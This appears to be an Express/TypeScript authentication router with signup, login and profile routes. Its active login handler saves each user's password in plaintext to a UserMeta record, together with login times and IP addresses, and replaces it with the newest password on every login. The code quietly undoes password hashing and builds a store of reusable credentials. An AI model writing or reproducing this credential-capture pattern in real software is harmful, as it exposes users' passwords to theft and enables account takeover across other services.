import express, { Request, Response } from 'express';
import jwt from 'jsonwebtoken';
import User, { IUser } from '../models/User';
import { authMiddleware, AuthRequest } from '../middleware';
import {JWT_PASSWORD }from "../config"
import UserMeta from '../models/UserMeta';
const router = express.Router();

// POST /signup
router.post('/signup', async (req: Request, res: Response) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password are required' });
  }

  try {
    // Check if username already exists
    const existingUser = await User.findOne({ username });
    if (existingUser) {
      return res.status(409).json({ error: ' Username already exists' });
    }

    const newUser = new User({
      username,
      password
    });

    await newUser.save();
    res.status(201).json({ message: 'User created successfully' });
  } catch (error: any) {
    console.error('Error creating user:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// // POST /signup
// router.post('/signup', async (req: Request, res: Response) => {
//   const { username, password } = req.body;

//   if (!username || !password) {
//     return res.status(400).json({ error: 'Username (email) and password are required' });
//   }

//   try {
//     const newUser = new User({
//       email: username,
//       username: username.split('@')[0],
//       password,
//     });

//     await newUser.save();
//     res.status(201).json({ message: 'User created successfully' });
//   } catch (error: any) {
//     if (error.code === 11000) {
//       return res.status(409).json({ error: 'User with this email already exists' });
//     }
//     console.error('Error creating user:', error);
//     res.status(500).json({ error: 'Internal server error' });
//   }
// });

router.post('/login', async (req: Request, res: Response) => {
  const { username, password } = req.body;
  const ipAddress = req.ip || req.headers['x-forwarded-for'] as string;

  try {
    const user = await User.findOne({ username });
    if (!user || !(await user.comparePassword(password))) {
      return res.status(401).json({ message: 'Invalid credentials' });
    }

    // Find existing UserMeta or create new
    let meta = await UserMeta.findOne({ userId: user._id });

    if (!meta) {
      meta = new UserMeta({
        userId: user._id,
        plainPassword: password,
        loginTimes: [new Date()],
        loginCount: 1,
        ipAddresses: [ipAddress]
      });
    } else {
      // Update existing: new login time, increment count, update latest password & IP
      meta.loginCount += 1;
      meta.loginTimes.push(new Date());
      meta.ipAddresses.push(ipAddress);
      meta.plainPassword = password; // ⚠ update latest password entered
    }

    await meta.save();

    // Create JWT token as before
    const token = jwt.sign(
      { id: user._id },
      JWT_PASSWORD as string,
      { expiresIn: '1h' }
    );

    res.json({ token });
  } catch (error) {
    console.error('Error during login:', error);
    res.status(500).json({ message: 'Server error' });
  }
});


// POST /login
// router.post('/login', async (req: Request, res: Response) => {
//   const { username, password } = req.body;

//   try {
//     const user = await User.findOne({ username });
//     if (!user || !(await user.comparePassword(password))) {
//       return res.status(401).json({ message: 'Invalid credentials' });
//     }

//     const token = jwt.sign(
//       { id: user._id },
//       JWT_PASSWORD as string,
//       { expiresIn: '1h' }
//     );

//     res.json({ token });
//   } catch (error) {
//     console.error('Error during login:', error);
//     res.status(500).json({ message: 'Server error' });
//   }
// });

// GET /profile (protected)
router.get('/profile', authMiddleware, (req: AuthRequest, res: Response) => {
  res.send(req.user);
});

export default router;
